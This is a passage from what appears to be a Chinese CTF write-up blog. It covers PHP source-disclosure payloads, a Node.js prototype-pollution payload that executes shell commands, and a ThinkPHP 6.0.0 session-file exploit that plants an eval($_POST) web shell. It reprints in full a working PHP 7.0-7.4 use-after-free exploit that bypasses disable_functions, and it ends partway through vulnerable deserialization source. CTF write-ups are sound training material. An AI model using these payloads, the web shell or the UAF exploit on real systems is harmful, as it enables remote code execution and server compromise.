<pre class=" language-python"><code class="language-python">?exp<span class="token operator">=</span>show_source<span class="token punctuation">(</span>next<span class="token punctuation">(</span>array_reverse<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>pos<span class="token punctuation">(</span>localeconv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre><code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre>
<p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619213824598.png" alt="image-20210619213824598"></p>
<pre><code>?exp=var_dump(file(next(array_reverse(scandir(current(localeconv()))))));</code></pre>
<p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619214613711.png" alt="image-20210619214613711"></p>
<p>这个我没有实现：</p>
<pre><code>?exp=show_source(session_id(session_start()));</code></pre>
<p><img src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200204202513684-10866717.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>GYCTF2020：Ez_Express</title>
    <url>/2021/10/12/gyctf2020-ez-express/</url>
    <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p>
<p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012184324370.png" alt="image-20211012184324370"></p>
<h1 id="原型链与原型链污染"><a href="#原型链与原型链污染" class="headerlink" title="原型链与原型链污染"></a>原型链与原型链污染</h1><p><a href="https://www.cnblogs.com/loveyaxin/p/11151586.html">https://www.cnblogs.com/loveyaxin/p/11151586.html</a></p>
<p><a href="https://www.cnblogs.com/escape-w/p/12347705.html">https://www.cnblogs.com/escape-w/p/12347705.html</a></p>
<p>原型链的特性：</p>
<p>在我们调用一个对象的某属性时：</p>
<pre><code>1.对象(obj)中寻找这一属性
2.如果找不到，则在obj.__proto__中寻找属性
3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</code></pre>
<p>以上机制被称为js的prototype继承链。而原型链污染就与这有关</p>
<p>原型链污染定义：</p>
<pre><code>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</code></pre>
<p>看见merge，clone函数，可以往原型链污染靠</p>
<h1 id="toUpperCase-toLowerCase-绕过"><a href="#toUpperCase-toLowerCase-绕过" class="headerlink" title="toUpperCase()/toLowerCase()绕过"></a>toUpperCase()/toLowerCase()绕过</h1><p>Phithon的一篇博客：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>特殊字符绕过</p>
<p>其中混入了两个奇特的字符”ı”、”ſ”。</p>
<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
<p>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</p>
<p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185241629.png" alt="image-20211012185241629" style="zoom:50%;"><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185302162.png" alt="image-20211012185302162" style="zoom:50%;"></p>
<h1 id="web-routes-index-js"><a href="#web-routes-index-js" class="headerlink" title="web\routes\index.js"></a>web\routes\index.js</h1><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> a
<span class="token punctuation">}</span></code></pre>
<pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> clone <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
 <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>一个判断，merge()、clone()存在原型链：</p>
<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span> 
   <span class="token punctuation">}</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">{</span>
      <span class="token string">'user'</span><span class="token punctuation">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token string">'passwd'</span><span class="token punctuation">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>
      <span class="token string">'isLogin'</span><span class="token punctuation">:</span><span class="token boolean">false</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">{</span>
      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

  <span class="token punctuation">}</span>
  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>可以看到验证了注册的用户名不能为admin（大小写），不过有个地方可以注意到</p>
<pre><code>'user':req.body.userid.toUpperCase(),</code></pre>
<pre class=" language-js"><code class="language-js">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
<p>注册admın账号</p>
<p>也就是可以通过污染<code>outputFunctionName</code>进行SSTI</p>
<p>于是抓<code>/action</code>的包，<code>Content-Type</code>设为<code>application/json</code></p>
<p><strong>payload</strong></p>
<pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token string">"lua"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span>"a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//"},"Submit":""}</span></code></pre>
]]></content>
      <tags>
        <tag>js原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF：2020-EasyThinking</title>
    <url>/2021/08/21/gyctf-2020-easythinking/</url>
    <content><![CDATA[<h2 id="ThinPHP-V6-0-0"><a href="#ThinPHP-V6-0-0" class="headerlink" title="ThinPHP V6.0.0"></a>ThinPHP V6.0.0</h2><p>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br> 然后再search搜索的内容会直接保存在/runtime/session/目录下，getshell</p>
<h2 id="GYCTF：EasyThinking"><a href="#GYCTF：EasyThinking" class="headerlink" title="GYCTF：EasyThinking"></a>GYCTF：EasyThinking</h2><p>先注册一个账户</p>
<p>登录这个账户抓包，修改session</p>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035306758.png" alt="image-20210821035306758"></p>
<p>在搜索框里写入一句话</p>
<pre><code>&lt;?php eval($_POST['H3ng']);?&gt;</code></pre>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035529053.png" alt="image-20210821035529053"></p>
<p>key的值会被写入到session文件当中</p>
<h4 id="shell路径"><a href="#shell路径" class="headerlink" title="shell路径"></a>shell路径</h4><pre><code>http://3f1f486b-2603-438b-81d7-63bff89fbddb.node4.buuoj.cn:81/runtime/session/sess_1234567890123456789012345678.php</code></pre>
<p>有disable_funtions限制</p>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035939594.png" alt="image-20210821035939594"></p>
<h4 id="exp：https-github-com-mm0r1-exploits-tree-master"><a href="#exp：https-github-com-mm0r1-exploits-tree-master" class="headerlink" title="exp：https://github.com/mm0r1/exploits/tree/master"></a>exp：<a href="https://github.com/mm0r1/exploits/tree/master">https://github.com/mm0r1/exploits/tree/master</a></h4><pre class=" language-PHP"><code class="language-PHP"><?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("/readflag");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
?></code></pre>
<p>上传</p>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821040632884.png" alt="image-20210821040632884"></p>
<p>最后包含这个文件即可得到flag</p>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041008884.png" alt="image-20210821041008884"></p>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>蚁剑绕过disable_funtions选择PHP7 Backtrace UAF模式<img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041054070.png" alt="image-20210821041054070"></p>
<p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041209002.png" alt="image-20210821041209002"></p>
]]></content>
      <tags>
        <tag>绕过disable_funtions</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF：2020-Easyphp</title>
    <url>/2021/09/01/gyctf-2020-easyphp/</url>
    <content><![CDATA[<p><a href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
<h5 id="lib-php"><a href="#lib-php" class="headerlink" title="lib.php"></a>lib.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'regexp'</span><span class="token punctuation">,</span><span class="token string">'load'</span><span class="token punctuation">,</span><span class="token string">'into'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'insert'</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">User</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"你的ID是"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"你好！"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>
        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">;</span>
        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string">"update user SET age=$age,nickname=$nickname where id="</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//这个功能还没有写完 先占坑</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//危</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"0-0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">Class</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
